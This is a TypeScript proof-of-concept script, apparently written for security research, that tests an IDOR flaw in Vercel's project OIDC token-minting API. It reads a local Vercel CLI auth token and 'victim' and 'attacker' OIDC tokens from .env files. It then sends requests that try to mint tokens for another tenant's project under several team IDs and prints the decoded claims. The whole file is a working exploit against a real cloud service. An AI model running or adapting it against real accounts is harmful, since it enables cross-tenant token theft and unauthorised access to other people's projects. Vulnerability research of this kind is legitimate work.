import { readFileSync } from "fs";
const AUTH = JSON.parse(readFileSync("/home/edwar/.local/share/com.vercel.cli/auth.json", "utf8"));
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const ATTACKER = loadEnv("/tmp/vercel-sandbox/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());
const A = JSON.parse(Buffer.from(ATTACKER.split(".")[1], "base64url").toString());

function claims(t: string) { return JSON.parse(Buffer.from(t.split(".")[1], "base64url").toString()); }

async function mint(label: string, bearer: string, projectId: string, teamId?: string) {
  const url = new URL(`https://api.vercel.com/v1/projects/${projectId}/token`);
  url.searchParams.set("source", "vercel-oidc-refresh");
  if (teamId) url.searchParams.set("teamId", teamId);
  const r = await fetch(url, { method: "POST", headers: { authorization: `Bearer ${bearer}`, "content-type": "application/json" } });
  const text = await r.text();
  console.log(`\n[${r.status}] ${label}`);
  console.log(`  POST ${url.pathname}?${url.searchParams}`);
  let out = text;
  if (r.ok) {
    try {
      const j = JSON.parse(text);
      const c = claims(j.token);
      out = `token minted → owner=${c.owner}, project=${c.project}, project_id=${c.project_id}, owner_id=${c.owner_id}, user_id=${c.user_id}`;
    } catch {}
  }
  console.log("  " + out);
}

async function main() {
  const PAT = AUTH.token;
  console.log("PAT user:", AUTH.userId, "exp:", new Date(AUTH.expiresAt * 1000).toISOString());

  await mint("CTRL: PAT víctima mint su project", PAT, V.project_id, V.owner_id);
  await mint("IDOR: PAT víctima mint project ATACANTE (teamId=A)", PAT, A.project_id, A.owner_id);
  await mint("IDOR: PAT víctima mint project ATACANTE (teamId=V)", PAT, A.project_id, V.owner_id);
  await mint("IDOR: PAT víctima mint project ATACANTE (sin teamId)", PAT, A.project_id);

  console.log("\nDONE");
}
main().catch((e) => console.error("ERR", e.message));